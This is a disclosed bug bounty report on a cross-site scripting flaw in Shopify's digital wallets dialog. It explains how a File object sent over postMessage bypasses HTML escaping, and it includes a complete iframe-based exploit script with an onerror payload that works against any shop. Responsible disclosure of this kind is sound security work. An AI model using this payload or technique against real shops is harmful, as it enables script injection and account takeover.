# XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog"

## Report Details
- **Report ID**: 231053
- **URL**: https://hackerone.com/reports/231053
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-05-23T09:55:08.696Z
- **Disclosed**: 2017-05-30T17:10:05.272Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Description
The `/:id/digital_wallets/dialog` endpoint is used to display a small dialog box relating to the "digital wallets" functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a "clone-able" object (per the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm)) this escaping can be bypassed allowing a malicious actor to obtain XSS. 

# Technical Background
Note: For the sake of clarity I've renamed some of the variables and re-written sections of code to only include the relevant functions from [the minified JavaScript](https://cdn.shopify.com/s/assets/services/digital_wallets/scripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js) so this report is easier to understand...
The [/:id/digital_wallets/dialog](https://bored-engineering-whitehat-2.myshopify.com/1337/digital_wallets/dialog) route initializes a postMessage listener on page load that looks like this:
```js
this._messageHandler = function(event) {
  if (event.data) {
    if (event.data.type && event.data.digitalWalletsDialog) {
      c(i, event.data.type, event.data.payload);
    }
  }
}
this._localWindow.addEventListener("message", this._messageHandler)
```
The `c` function which handles the message is responsible for a few different message types, in this case we're only interested in the `DigitalWalletsDialog:change` type:
```js
function c(inst, type, payload) {
  switch (type) {
    case ze.DIALOG_CHANGE: // DigitalWalletsDialog:change
      if (d(payload)) { // Check that the required fields are present
        g(inst) // Reset the DOM
        p(inst, payload) // Insert the payload into the DOM
...
```
As noted in my previous comments the `d` function and `g` function are relatively straightforward and un-interesting:
```js
function d(payload) {
  var required = ["title", "button"]
  for (var idx = 0; idx < required.length; idx++)
    if (!payload[required[idx]] || "" === !payload[required[idx]]) {
      return false
    }
    return true
}
function g(inst) {
  for (var idx in inst.customizableElements) {
    inst.customizableElements[idx].innerHTML = ""
    inst.customizableElements[idx].classList.remove("hidden")
  }
  inst.customizableElements.errorList.scrollTop = 0
}
```
Understanding all of the previous pieces, we can pass a legitimate message through the functions like so:
```js
window.postMessage({
  type: "DigitalWalletsDialog:change",
  digitalWalletsDialog: true,
  payload: {
    title: "placeholder",
    button: "placeholder"
  },
}, "*");
```
And when we do the dialog renders as expected:
{F187323}
Looking more into the `p` function we see it is responsible for setting/creating the values for a number of elements on the DOM:
```js
function p(inst, payload) {
  _(inst, t.icon)
  v(inst, "title", payload.title)
  if (payload.errors) {
    if (Array.isArray(payload.errors)) {
      if (payload.errors.length > 1) {
        v(inst, "errorList", h(payload.errors))
        inst.customizableElements.errorDescription.classList.add("hidden")
        inst.staticElements.errorListContainer.classList.remove("hidden")
      } else {
        v(inst, "errorDescription", payload.errors[0])
        inst.staticElements.errorListContainer.classList.add("hidden")
      }
    } else { 
      e.customizableElements.errorDescription.classList.add("hidden")
    }
  }
  if (payload.lineItems) {
    v(inst, "errorList", f(payload.lineItems)) 
    inst.staticElements.errorListContainer.classList.remove("hidden")
    v(inst, "dismissButton", payload.button || "Close")
  }
}
```
The part we're going to focus on is the `payload.lineItems` handling. The items are passed into the `f` function which is defined as follows:
```js
function f(payload) {
  var table = document.createElement("table")
  table.className = "product-table"
  table.id = "dialog__product-table"
  table.innerHTML = T // <thead><tr>...
  payload.forEach(function(lineItem) {
    table.tBodies[0].innerHTML += m(lineItem)
  })
  return table
}
```
It appears that function creates a table for each `lineItem` rendering them with the `m` function:
```js
function m(payload) {
  var escaped = u(payload)
  if (escaped.variant) {
    return '\n      <span class="product__description__variant order-summary__small-text">\n        ' + escaped.variant + "\n      </span>"
  }
  return '\n    <tr class="product">\n      <td class="product__image">\n        <div class="product-thumbnail">\n          <div class="product-thumbnail__wrapper">\n            <img alt="' + t.name + '" class="product-thumbnail__image" src="' + t.image + '">\n          </div>\n          <span class="product-thumbnail__quantity" aria-hidden="true">' + t.amount + '</span>\n        </div>\n      </td>\n      <td class="product__description">\n        <span class="product__description__name order-summary__emphasis">' + t.name + "</span>\n        " + n + '\n      </td>\n      <td class="product__quantity visually-hidden">' + t.amount + '</td>\n      <td class="product__status product__status--sold-out">' + t.message + "</td>\n    </tr>\n  "
}
``` 
And again we can verify this assumption by testing it:
```
window.postMessage({
  type: "DigitalWalletsDialog:change",
  digitalWalletsDialog: true,
  payload: {
    title: "placeholder",
    button: "placeholder",
    lineItems: [{
      name: "product",
      amount: "$13.37",
      message: "added to cart"
    }],
  },
}, "*");
```
And we get the expected result:
{F187326}

# Technical Details
So now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...
The main function we're interested in here is the `u` which handles escaping all attributes on the payload:
```js
function u(payload) {
  for (var idx in payload) {
    if (payload.hasOwnProperty(idx)) {
      payload[idx] = Ve.escapeHtml(payload[idx]);
    }
  }
  return payload;
}
```
Now if we assume that `escapeHtml` function does not have any issues/bypasses, we can observe something interesting: The function does not create a "new" escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to `hasOwnProperty` it will not be escaped. We can test this locally:
```js
// Expected to fail:
result = u({
  message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
This is great, but in practice we're limited to only a few properties that are actually accessed by the HTML template:

* `variant`
* `name`
* `image`
* `message`

Additionally, we're limited to only objects which can be passed over postMessage, for example we can't use the [Error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error) object which already has a `message` attribute. The list of allowed objects for postMessage is defined as part of the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).

After a bit of experimentation with each of them, it looks like the [File](https://developer.mozilla.org/en-US/docs/Web/API/File) object is perfect for this exploit as it has a read-only `name` property which is used by our template. We can test it out like so:
```js
let f = new File(["data"], "controlledvalue");
f.name; // "controlledvalue"
f.hasOwnProperty("name"); // false
```
Putting this all together with an iframe to make it clean we get the final exploit:
```js
let shop = prompt("Enter a Target Shop URL:", "https://bored-engineering-whitehat-2.myshopify.com");
let frame = document.createElement("iframe");
frame.src = `${shop}/1337/digital_wallets/dialog`;
frame.style.display = "none";
frame.onload = () => {
  frame.contentWindow.postMessage({
    type: "DigitalWalletsDialog:change",
    digitalWalletsDialog: true,
    payload: {
      title: "placeholder",
      button: "placeholder",
      lineItems: [new File([""], "<img src=xx: onerror=alert(document.domain)>")],
    },
  }, "*");
}
document.body.appendChild(frame);
```

# Exploitability
As shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the `/:id/digital_wallets/dialog` route which is not under `/admin`, though at this point in time it would be trivial to escalate that access to the `/admin` route. 

# Proof of Concept
I've hosted a simple PoC at [https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html](https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html).

# Remediation
This issue could be fixed either within the `u` function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running `JSON.parse` on the message, and exiting the handling if parsing fails. 

## Attachments
- Screen_Shot_2017-05-23_at_2.18.44_AM.png
- Screen_Shot_2017-05-23_at_2.24.34_AM.png
